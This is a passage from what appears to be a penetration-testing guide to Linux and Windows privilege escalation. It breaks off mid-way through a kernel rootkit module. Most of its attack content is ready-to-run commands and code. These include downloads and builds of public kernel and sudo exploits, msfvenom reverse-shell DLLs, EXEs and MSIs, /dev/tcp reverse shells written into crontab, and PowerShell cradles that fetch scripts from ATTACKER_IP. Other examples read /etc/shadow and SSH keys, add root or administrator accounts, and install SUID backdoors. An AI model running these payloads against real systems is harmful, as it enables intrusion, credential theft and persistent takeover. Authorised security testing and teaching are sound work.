
```bash
sudo python -c 'import os; os.system("/bin/bash")'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'
```

### CVE-Based Sudo Exploits

**CVE-2019-14287 (Sudo < 1.8.28):**

Bypass security policy when user can run commands as any user except root:

```bash
# Configuration shows: (ALL, !root) /usr/bin/binary
sudo -u#-1 /usr/bin/binary
# Executes as root due to integer overflow
```

**CVE-2021-3156 (Baron Samedit - Sudo before 1.9.5p2):**

Heap-based buffer overflow exploitation:

```bash
# Multiple public exploits available
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich
```

[Unverified] - Effectiveness depends on target system configuration and exploit variant.

---

## Kernel Exploits

### Enumeration

**Identify kernel version:**

```bash
uname -a
uname -r
cat /proc/version
cat /etc/os-release
```

**Detailed system information:**

```bash
hostnamectl
lsb_release -a
```

**Architecture:**

```bash
uname -m
dpkg --print-architecture
```

**Check for kernel hardening:**

```bash
cat /proc/sys/kernel/dmesg_restrict
cat /proc/sys/kernel/kptr_restrict
cat /proc/sys/kernel/perf_event_paranoid
```

### Kernel Exploit Databases

**Searchsploit integration:**

```bash
searchsploit linux kernel 5.4
searchsploit -m linux/local/exploit_id.c
```

**Linux Exploit Suggester:**

```bash
git clone https://github.com/mzet-/linux-exploit-suggester.git
cd linux-exploit-suggester
./linux-exploit-suggester.sh
```

**Linux Smart Enumeration (LSE):**

```bash
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o lse.sh
chmod +x lse.sh
./lse.sh -l 2
```

### Notable Kernel Exploits

**Dirty COW (CVE-2016-5195) - Linux Kernel 2.6.22 < 3.9:**

Race condition in memory subsystem:

```bash
# Multiple variants available
git clone https://github.com/FireFart/dirtycow.git
cd dirtycow
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

**CVE-2017-16995 - Linux Kernel 4.4 < 4.14.11:**

eBPF verifier flaw:

```bash
wget https://www.exploit-db.com/raw/45010 -O exploit.c
gcc exploit.c -o exploit
./exploit
```

**CVE-2021-3493 (OverlayFS) - Ubuntu Kernel < 5.11.0:**

OverlayFS capability bypass:

```bash
wget https://www.exploit-db.com/raw/49859 -O exploit.c
gcc exploit.c -o exploit
./exploit
```

**CVE-2022-0847 (Dirty Pipe) - Linux Kernel 5.8 < 5.16.11:**

Arbitrary file overwrite vulnerability:

```bash
wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
gcc exploit.c -o exploit
./exploit
```

**CVE-2021-4034 (PwnKit) - Polkit pkexec:**

Memory corruption in pkexec:

```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
make
./cve-2021-4034
```

**CVE-2009-1185 (udev) - udev < 1.4.1:**

Netlink message exploitation:

```bash
searchsploit -m 8572
gcc 8572.c -o exploit
./exploit
```

### Compilation Considerations

**Cross-compilation for target architecture:**

```bash
# For 32-bit target from 64-bit system
gcc -m32 exploit.c -o exploit

# For static compilation (no library dependencies)
gcc -static exploit.c -o exploit

# For ARM architecture
arm-linux-gnueabihf-gcc exploit.c -o exploit
```

**Transfer compiled exploits:**

```bash
# HTTP server on attacker
python3 -m http.server 8000

# On target
wget http://attacker_ip:8000/exploit
curl http://attacker_ip:8000/exploit -o exploit
```

### Kernel Exploit Precautions

[Inference] - Kernel exploits may cause system instability or crashes. Observations from practice:

- Test exploits in controlled environments first
- Understand exploit mechanism before execution
- Have system recovery plan ready
- Some exploits require specific timing or race condition wins
- Failed kernel exploits may trigger system panics

---

## Service Exploitation

### Service Enumeration

**List running services:**

```bash
ps aux
ps -ef
pstree -p
```

**Services running as root:**

```bash
ps aux | grep ^root
ps -U root -u root u
```

**Network services:**

```bash
netstat -antup
ss -tulpn
lsof -i
```

**Systemd services:**

```bash
systemctl list-units --type=service
systemctl status <service_name>
systemctl show <service_name>
```

**Check service file permissions:**

```bash
find /etc/systemd/system -type f -writable 2>/dev/null
ls -la /etc/systemd/system/*.service
```

### Writable Service Configuration

**Systemd service file modification:**

If service file is writable:

```bash
cat > /etc/systemd/system/vulnerable.service << EOF
[Unit]
Description=Vulnerable Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'chmod +s /bin/bash'
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl restart vulnerable
/bin/bash -p
```

**Init.d script modification:**

```bash
# If /etc/init.d/service is writable
echo "chmod +s /bin/bash" >> /etc/init.d/vulnerable_service
/etc/init.d/vulnerable_service restart
/bin/bash -p
```

### Writable Service Binaries

**If service binary path is writable:**

```bash
# Backup original
cp /usr/local/bin/service /tmp/service.bak

# Replace with malicious binary
cat > /tmp/payload.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

gcc /tmp/payload.c -o /usr/local/bin/service
# Wait for service restart or restart manually
```

### Cron Job Exploitation

**Enumerate cron jobs:**

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*
```

**Writable cron scripts:**

```bash
# Find world-writable cron scripts
find /etc/cron* -type f -perm -o+w 2>/dev/null

# If script is writable
echo "chmod +s /bin/bash" >> /path/to/cron/script.sh
# Wait for execution
/bin/bash -p
```

**Cron PATH exploitation:**

If crontab entry runs script without absolute path:

```bash
# Create malicious binary in writable PATH location
cat > /tmp/script.sh << EOF
#!/bin/bash
chmod +s /bin/bash
EOF

chmod +x /tmp/script.sh
# If /tmp is in cron PATH, wait for execution
```

**Wildcard injection in cron:**

Similar to tar wildcard exploitation documented in sudo section.

### Docker/LXD Group Privilege Escalation

**Check group membership:**

```bash
id
groups
cat /etc/group | grep docker
cat /etc/group | grep lxd
```

**Docker group exploitation:**

```bash
# If user is in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Now inside container with host filesystem mounted
```

**Alternative Docker exploitation:**

```bash
docker run -v /:/hostfs --rm -it ubuntu bash
cd /hostfs
chroot . bash
```

**LXD/LXC group exploitation:**

```bash
# On attacker machine, build Alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine

# Transfer alpine-v3.xx-x86_64-xxxxx.tar.gz to target

# On target
lxc image import ./alpine*.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
cd /mnt/root/root
```

### Database Service Exploitation

**MySQL running as root with FILE privilege:**

```bash
mysql -u user -p

# UDF (User Defined Function) exploitation
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('chmod +s /bin/bash');
```

**PostgreSQL as postgres user:**

```bash
psql -U postgres

# Execute system commands
COPY (SELECT '') TO PROGRAM 'chmod +s /bin/bash';
```

### NFS Misconfiguration

**Check NFS exports:**

```bash
cat /etc/exports
showmount -e <target_ip>
```

**no_root_squash exploitation:**

If NFS export has `no_root_squash`:

```bash
# On attacker machine as root
mkdir /tmp/nfs
mount -t nfs target:/share /tmp/nfs
cd /tmp/nfs

# Create SUID binary
cp /bin/bash .
chmod +s bash

# On target machine
cd /share
./bash -p
```

### Tmux/Screen Session Hijacking

**Enumerate sessions:**

```bash
tmux ls
screen -ls
ls -la /tmp/tmux-* /var/run/screen
```

**Attach to session:**

```bash
# If session owned by root and writable socket
tmux -S /tmp/tmux-session attach
screen -x root/session_name
```

---

**Related Critical Topics**

For comprehensive privilege escalation methodology, also investigate:

- **Windows Privilege Escalation** - Completely different attack surface with Registry exploitation, DLL hijacking, token impersonation, and service binary path vulnerabilities
- **Capabilities Exploitation** - Linux capabilities system often overlooked; capabilities like CAP_SETUID provide privilege escalation without SUID
- **Container Escape Techniques** - Docker/Kubernetes-specific breakout methods beyond group membership exploitation
- **Exploitation Frameworks** - Metasploit's local exploit suggester, PowerSploit modules, and automated enumeration framework integration

---

## DLL Hijacking

DLL Hijacking exploits the Windows DLL search order mechanism to execute malicious code with elevated privileges. When an application loads a DLL without specifying its absolute path, Windows searches through a predefined sequence of directories.

### Windows DLL Search Order

**Standard search order (without SafeDllSearchMode or with it enabled):**

1. Directory from which the application loaded
2. System directory (`C:\Windows\System32`)
3. 16-bit system directory (`C:\Windows\System`)
4. Windows directory (`C:\Windows`)
5. Current working directory
6. Directories in PATH environment variable

**With SafeDllSearchMode disabled:** Current working directory moves to position 2, before system directories.

### Identifying DLL Hijacking Opportunities

**Using Process Monitor (Procmon)**

```cmd
# Download from Sysinternals Suite
# Filter settings:
- Result: NAME NOT FOUND
- Path: ends with .dll
- Operation: CreateFile
```

**Procmon configuration for DLL hijacking detection:**

1. Run target application as administrator
2. Apply filters: `Result is NAME NOT FOUND` and `Path ends with .dll`
3. Identify DLLs loaded from writable directories
4. Check if application runs with elevated privileges

**PowerShell enumeration:**

```powershell
# Check writable directories in PATH
$env:PATH -split ';' | ForEach-Object {
    if (Test-Path $_) {
        $acl = Get-Acl $_
        $acl.Access | Where-Object {
            $_.FileSystemRights -match "Write|FullControl" -and
            $_.IdentityReference -match "Users|Everyone"
        }
    }
}
```

**Using PowerUp (PowerSploit):**

```powershell
Import-Module .\PowerUp.ps1
Find-ProcessDLLHijack
Find-PathDLLHijack
```

### Creating Malicious DLLs

**Basic DLL template (C++):**

```cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Payload execution
            system("cmd.exe /c net localgroup administrators user /add");
            break;
    }
    return TRUE;
}
```

**Compilation:**

```bash
# On Linux with mingw
x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.c

# 32-bit version
i686-w64-mingw32-gcc -shared -o malicious.dll malicious.c
```

**Using msfvenom:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o malicious.dll

# 32-bit
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o malicious.dll
```

### DLL Proxying

When replacing a legitimate DLL, implement proxying to maintain application functionality:

**Steps:**

1. Rename original DLL (e.g., `original.dll` â†’ `original_real.dll`)
2. Create proxy DLL that forwards legitimate calls
3. Add malicious code in `DllMain`

**Proxy generation tools:**

- SharpDllProxy
- DLL Export Viewer + manual forwarding

### Common Vulnerable Scenarios

**Writable application directories:**

```cmd
icacls "C:\Program Files\VulnerableApp"
# Look for: BUILTIN\Users:(OI)(CI)(M) or similar write permissions
```

**Service-based DLL hijacking:**

```cmd
# Enumerate services and their binaries
sc query state= all
sc qc [ServiceName]

# Check permissions
icacls "C:\Path\To\Service.exe"
```

### Detection Commands

**Using Sigcheck (Sysinternals):**

```cmd
sigcheck -u -e C:\Windows\System32
# Identifies unsigned DLLs
```

**Listing loaded DLLs:**

```cmd
tasklist /m
tasklist /m /fi "PID eq 1234"
```

**PowerShell:**

```powershell
Get-Process | Select-Object -ExpandProperty Modules | Sort-Object -Unique FileName
```

## PATH Hijacking

PATH Hijacking exploits Windows' executable search behavior by placing malicious executables in directories that appear earlier in the PATH environment variable.

### Understanding PATH Priority

Windows searches for executables in this order:

1. Current directory (if enabled)
2. Directories in PATH (left to right)

**Enumerate current PATH:**

```cmd
echo %PATH%

# PowerShell
$env:PATH -split ';'
```

### Identification Methodology

**Check writable PATH directories:**

```powershell
$env:PATH -split ';' | ForEach-Object {
    if (Test-Path $_) {
        $path = $_
        $acl = Get-Acl $path
        Write-Host "`nPath: $path"
        $acl.Access | Where-Object {
            ($_.FileSystemRights -match "Write|Modify|FullControl") -and
            ($_.IdentityReference -notmatch "SYSTEM|Administrators")
        } | Select-Object IdentityReference, FileSystemRights
    }
}
```

**CMD version:**

```cmd
for %i in ("%path:;=" "%") do @icacls %i 2>nul | findstr /i "everyone users"
```

**Using PowerUp:**

```powershell
Get-ModifiablePath
```

### Exploitation Process

**1. Identify target executable called without full path:**

Common examples:

- `wmic.exe` called as just `wmic`
- `python` without `.exe` extension
- Administrative scripts calling system utilities

**2. Create malicious executable:**

```bash
# Using msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o wmic.exe

# Using C
x86_64-w64-mingw32-gcc payload.c -o wmic.exe
```

**Simple payload example (C):**

```c
#include <stdlib.h>
int main() {
    system("cmd.exe /c net localgroup administrators lowpriv /add");
    return 0;
}
```

**3. Place in writable PATH directory:**

```cmd
copy malicious.exe C:\WritablePathDir\targetname.exe
```

**4. Wait for or trigger execution:**

- Scheduled tasks calling the hijacked command
- Services restarting
- Administrative scripts
- User executing the command

### Service PATH Hijacking

**Enumerate services with unquoted paths:**

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**Check service permissions:**

```cmd
sc qc [ServiceName]
accesschk.exe -accepteula -uwcv [User] *
```

### System-Wide vs User PATH

**Current user PATH:**

```cmd
reg query "HKCU\Environment" /v PATH
```

**System PATH:**

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATH
```

**Modify user PATH (if writable):**

```cmd
setx PATH "C:\Writable\Dir;%PATH%"
```

## Unquoted Service Path

This vulnerability occurs when Windows services have executable paths containing spaces without proper quotation, allowing injection of malicious executables in intermediate directories.

### Vulnerability Mechanics

**Example vulnerable path:**

```
C:\Program Files\Vulnerable Service\service.exe
```

**Windows interprets as:**

1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Service\service.exe`

### Enumeration Techniques

**Manual WMIC query:**

```cmd
wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**PowerShell comprehensive check:**

```powershell
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notmatch '^"' -and 
    $_.PathName -match ' ' -and
    $_.PathName -notmatch 'C:\\Windows'
} | Select-Object Name, PathName, StartMode, State
```

**Using accesschk.exe (Sysinternals):**

```cmd
accesschk.exe /accepteula -uwdq C:\
accesschk.exe /accepteula -uwdq "C:\Program Files\"
accesschk.exe /accepteula -uwdq "C:\Program Files (x86)\"
```

**PowerUp automated check:**

```powershell
Import-Module .\PowerUp.ps1
Get-UnquotedService
```

**WinPEAS (automated enumeration):**

```cmd
winPEASany.exe quiet servicesinfo
```

### Exploitation Requirements

**Three conditions must be met:**

1. Service path contains spaces and lacks quotes
2. Current user has write permissions to an intermediate directory
3. Service runs with elevated privileges (LocalSystem, Administrator)

**Verify service privileges:**

```cmd
sc qc [ServiceName]
# Check SERVICE_START_NAME field
```

**Check directory permissions:**

```cmd
icacls "C:\Program Files\Vulnerable Service"

# Look for:
# BUILTIN\Users:(OI)(CI)(M)
# BUILTIN\Users:(I)(OI)(CI)(F)
```

**Systematic permission check:**

```powershell
$path = "C:\Program Files\Vulnerable Service\subdir\service.exe"
$parts = $path -split '\\'
for ($i = 1; $i -lt $parts.Length - 1; $i++) {
    $checkPath = ($parts[0..$i] -join '\')
    if (Test-Path $checkPath) {
        Write-Host "`nChecking: $checkPath"
        (Get-Acl $checkPath).Access | Where-Object {
            $_.FileSystemRights -match "Write|Modify|FullControl"
        } | Select-Object IdentityReference, FileSystemRights
    }
}
```

### Exploitation Process

**1. Identify vulnerable service:**

```cmd
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**2. Determine injection point:**

```
Service path: C:\Program Files\Vulnerable App\Sub Dir\service.exe
Writable: C:\Program Files\Vulnerable App\

Inject as: C:\Program Files\Vulnerable App\Sub.exe
```

**3. Generate payload:**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o Sub.exe
```

**4. Upload and position payload:**

```cmd
copy Sub.exe "C:\Program Files\Vulnerable App\"
```

**5. Start/restart service:**

```cmd
# If you have service control permissions
sc stop [ServiceName]
sc start [ServiceName]

# Or wait for system reboot/service restart
shutdown /r /t 0
```

**Check service start permissions:**

```cmd
accesschk.exe /accepteula -ucqv [User] [ServiceName]
```

### Alternative Injection Points

**For path:** `C:\Program Files\Company Name\Product Version\bin\service.exe`

**Possible injections:**

- `C:\Program.exe`
- `C:\Program Files\Company.exe`
- `C:\Program Files\Company Name\Product.exe`

**Priority:** Windows attempts execution in order, stopping at first successful execution.

## AlwaysInstallElevated

This vulnerability exists when both user-level and machine-level registry settings allow standard users to install MSI packages with SYSTEM privileges.

### Vulnerability Conditions

**Both registry keys must be set to 1:**

```
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
```

### Enumeration Techniques

**Registry query (CMD):**

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**PowerShell:**

```powershell
$HKLM = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$HKCU = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

if ($HKLM.AlwaysInstallElevated -eq 1 -and $HKCU.AlwaysInstallElevated -eq 1) {
    Write-Host "AlwaysInstallElevated is enabled!" -ForegroundColor Red
}
```

**Using PowerUp:**

```powershell
Import-Module .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated
Write-UserAddMSI
```

**WinPEAS detection:**

```cmd
winPEASany.exe quiet systeminfo
```

### Exploitation Methods

**Method 1: Using msfvenom**

```bash
# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o malicious.msi

# Alternative payloads
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi -o adduser.msi
msfvenom -p windows/exec CMD="net localgroup administrators lowpriv /add" -f msi -o elevate.msi
```

**Method 2: Using PowerUp**

```powershell
Import-Module .\PowerUp.ps1

# Creates MSI that adds user to administrators
Write-UserAddMSI

# Output: UserAdd.msi
```

**Method 3: Manual MSI creation with WiX Toolset**

```xml
<!-- product.wxs -->
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
   <Product Id="*" Name="Malicious" Language="1033" Version="1.0.0.0" Manufacturer="Company">
      <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />
      <Media Id="1" Cabinet="media1.cab" EmbedCab="yes" />
      
      <Directory Id="TARGETDIR" Name="SourceDir">
         <Directory Id="ProgramFilesFolder">
            <Directory Id="INSTALLFOLDER" Name="Product" />
         </Directory>
      </Directory>
      
      <Feature Id="ProductFeature" Title="Main" Level="1">
         <ComponentGroupRef Id="ProductComponents" />
      </Feature>
      
      <CustomAction Id="RunPayload" Directory="TARGETDIR" 
                    ExeCommand="cmd.exe /c net localgroup administrators lowpriv /add" 
                    Execute="deferred" Impersonate="no" Return="ignore" />
                    
      <InstallExecuteSequence>
         <Custom Action="RunPayload" After="InstallInitialize" />
      </InstallExecuteSequence>
   </Product>
   
   <Fragment>
      <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER" />
   </Fragment>
</Wix>
```

**Compile WiX:**

```cmd
candle.exe product.wxs
light.exe -out malicious.msi product.wixobj
```

### Installation Execution

**Silent installation (no GUI):**

```cmd
msiexec /quiet /qn /i malicious.msi
```

**Standard installation:**

```cmd
msiexec /i malicious.msi
```

**Network installation:**

```cmd
msiexec /i \\10.10.14.5\share\malicious.msi /quiet
```

**Installation with logging:**

```cmd
msiexec /i malicious.msi /L*V install.log /quiet
```

### Metasploit Module

```bash
msfconsole
use exploit/windows/local/always_install_elevated
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
exploit
```

### Verification Post-Exploitation

**Check if user was added to administrators:**

```cmd
net localgroup administrators
```

**Verify privileges:**

```cmd
whoami /priv
whoami /groups
```

### Defense Detection

**Registry monitoring for these keys:**

```powershell
# Set up audit policy
auditpol /set /subcategory:"Registry" /success:enable /failure:enable

# Monitor MSI installations
Get-WinEvent -LogName Application | Where-Object {$_.ProviderName -eq "MsiInstaller"}
```

---

## Token Manipulation

Token manipulation exploits Windows access token mechanisms to elevate privileges by impersonating higher-privileged users or processes.

### Access Token Fundamentals

Windows access tokens contain security context information: user SID, group memberships, privilege assignments, and integrity levels. Tokens are assigned at logon and inherited by child processes. Two primary token types exist: primary tokens (associated with processes) and impersonation tokens (for thread-level operations).

### SeImpersonatePrivilege Exploitation

When a user has `SeImpersonatePrivilege`, they can impersonate any token they can obtain a handle to. This privilege is commonly assigned to service accounts (IIS, MSSQL, network service accounts).

**Enumeration:**

```bash
# Check current user privileges
whoami /priv

# Look for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
```

**JuicyPotato Exploitation (Windows Server 2016 and earlier):**

```bash
# Basic execution
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > c:\temp\out.txt" -t *

# With specific CLSID
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker Password123! /add" -t * -c {CLSID}

# Reverse shell
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass -c IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')" -t *
```

Parameters:

- `-l`: COM server listening port
- `-p`: Program to launch
- `-a`: Arguments for program
- `-t`: createprocess call (use * for auto)
- `-c`: CLSID (COM object identifier)

**[Unverified]** CLSID selection varies by Windows version and installed software. Test multiple CLSIDs from JuicyPotato's repository.

**PrintSpoofer/RoguePotato (Windows Server 2019+):**

```bash
# PrintSpoofer (simpler, works on Server 2019+)
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')"

# RoguePotato (requires redirector setup)
# On attacker machine - redirect port 135
socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999

# On target
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe" -l 9999
```

**GodPotato (Windows Server 2012-2022):**

```bash
# Basic command execution
GodPotato.exe -cmd "cmd /c whoami"

# Add administrator user
GodPotato.exe -cmd "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"
```

### Token Theft and Impersonation

**Using Incognito (Metasploit):**

```bash
# Within meterpreter session
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

**Manual Token Impersonation (PowerShell):**

```powershell
# Requires SeDebugPrivilege
$ProcessId = (Get-Process lsass).Id
$hProcess = [Kernel32]::OpenProcess(0x1F0FFF, $false, $ProcessId)
[Advapi32]::OpenProcessToken($hProcess, 0x02, [ref]$hToken)
[Advapi32]::DuplicateToken($hToken, 2, [ref]$hDupToken)
[Advapi32]::ImpersonateLoggedOnUser($hDupToken)
```

### Named Pipe Impersonation

Services connecting to attacker-controlled named pipes can have their tokens captured.

```bash
# Create malicious named pipe service
# C++ or C# implementation required - pseudocode approach
# 1. Create named pipe
# 2. Trigger service connection
# 3. Impersonate connecting client

# Using PipeViewer enumeration
pipelist.exe /accepteula

# Exploitation typically requires custom tooling or Metasploit modules
```

## Scheduled Task Exploitation

Scheduled tasks running with elevated privileges that have weak permissions or modifiable components.

### Task Enumeration

```bash
# List all scheduled tasks
schtasks /query /fo LIST /v

# More detailed output
schtasks /query /fo LIST /v > tasks.txt

# PowerShell enumeration
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select TaskName,TaskPath,State

# Check task permissions
icacls C:\Windows\System32\Tasks\

# View specific task XML
type C:\Windows\System32\Tasks\TASKNAME
```

### Writable Task Binary Exploitation

**Identify writable executables:**

```bash
# Check permissions on task executable
icacls "C:\Path\To\Scheduled\Binary.exe"

# Look for (F)ull or (M)odify permissions
# F = Full control
# M = Modify
# W = Write
```

**Replace binary:**

```bash
# Backup original
move C:\Path\To\Binary.exe C:\Path\To\Binary.exe.bak

# Replace with malicious executable
# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe

# Transfer and replace
copy shell.exe C:\Path\To\Binary.exe

# Wait for scheduled execution or trigger manually
schtasks /run /tn "TaskName"
```

### Task XML Modification

If task XML files are writable, modify the action element:

```bash
# Export task
schtasks /query /tn "TaskName" /xml > task.xml

# Modify <Command> and <Arguments> elements
# Example modification:
<Exec>
  <Command>cmd.exe</Command>
  <Arguments>/c powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')"</Arguments>
</Exec>

# Delete and recreate task
schtasks /delete /tn "TaskName" /f
schtasks /create /tn "TaskName" /xml task.xml
```

### DLL Hijacking in Scheduled Tasks

**Identify missing DLLs:**

```bash
# Use Process Monitor (procmon.exe) to observe task execution
# Filter: Operation is CreateFile, Result is NAME NOT FOUND, Path ends with .dll

# Alternative: use listdlls
listdlls.exe -u TaskExecutable.exe
```

**Exploitation:**

```bash
# Generate malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o malicious.dll

# Place in writable directory in DLL search order
# Common locations:
# - Application directory
# - C:\Windows\System32 (if writable)
# - C:\Windows\System
# - Current directory
# - %PATH% directories

copy malicious.dll C:\Writable\Path\target.dll
```

### AlwaysInstallElevated with Scheduled Tasks

If `AlwaysInstallElevated` is enabled, MSI installers run as SYSTEM.

```bash
# Check registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Both must be set to 1

# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi

# Create scheduled task to execute MSI
schtasks /create /tn "UpdateTask" /tr "msiexec /quiet /qn /i C:\Temp\shell.msi" /sc onlogon /ru System
```

## Capability Exploitation (Linux)

Linux capabilities provide fine-grained privilege division, splitting root privileges into distinct units. Misconfigured capabilities can enable privilege escalation.

### Capability Enumeration

```bash
# List files with capabilities
getcap -r / 2>/dev/null

# Check specific file
getcap /path/to/binary

# List all possible capabilities
capsh --print
```

### Exploitable Capabilities

**CAP_SETUID**

Allows arbitrary UID changes, enabling direct escalation to root.

```bash
# If Python has cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If Perl has cap_setuid
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Custom C program
cat > setuid.c << EOF
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
EOF
gcc setuid.c -o setuid
./setuid
```

**CAP_DAC_READ_SEARCH**

Bypasses file read permission checks and directory search restrictions.

```bash
# Read sensitive files
# If tar has this capability
cd /
tar czf /tmp/shadow.tar.gz etc/shadow
cd /tmp
tar xzf shadow.tar.gz
cat etc/shadow

# Using Python
python3 << EOF
with open("/etc/shadow", "r") as f:
    print(f.read())
EOF

# Read SSH keys
tar czf /tmp/root_ssh.tar.gz root/.ssh/id_rsa
```

**CAP_DAC_OVERRIDE**

Bypasses file read, write, and execute permission checks.

```bash
# Write to /etc/passwd
# If Python has cap_dac_override
python3 -c 'open("/etc/passwd", "a").write("hacker:x:0:0::/root:/bin/bash\n")'

# Modify sudoers
echo "user ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/user

# Replace authorized_keys
echo "YOUR_SSH_PUBLIC_KEY" > /root/.ssh/authorized_keys
```

**CAP_CHOWN**

Allows arbitrary ownership changes.

```bash
# Take ownership of sensitive files
# If Python has cap_chown
python3 -c 'import os; os.chown("/etc/shadow", 1000, 1000)'

# Take ownership of SUID binary directory
chown -R user:user /usr/bin/
# Then replace SUID binary
```

**CAP_FOWNER**

Bypasses permission checks on file operations where the filesystem UID must match file owner UID.

```bash
# Modify SUID binary permissions
# If binary has cap_fowner
chmod u+s /usr/bin/less

# Modify crontab files
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /etc/crontab
```

**CAP_SYS_ADMIN**

Extremely powerful capability enabling numerous exploitation paths including mounting filesystems.

```bash
# Mount host filesystem from container
mkdir /mnt/host
mount -t auto /dev/sda1 /mnt/host
chroot /mnt/host

# Access host resources
cat /mnt/host/etc/shadow
```

**CAP_SYS_PTRACE**

Allows process memory injection and debugging.

```bash
# Inject shellcode into root process
# Requires custom exploit or tools like ptraceInjector

# Basic approach - attach to root process and manipulate
gdb -p ROOT_PID
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")

# Using Python ptrace
python3 << EOF
import ptrace.debugger
pid = ROOT_PROCESS_PID
debugger = ptrace.debugger.PtraceDebugger()
process = debugger.addProcess(pid, False)
# Inject shellcode here
EOF
```

**CAP_SYS_MODULE**

Allows kernel module loading.

```bash
# Create malicious kernel module
cat > rootkit.c << EOF
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cred.h>

static int __init rootkit_init(void) {
    struct cred *creds = prepare_creds();
    creds->uid.val = 0;
    creds->gid.val = 0;
    creds->euid.val = 0;
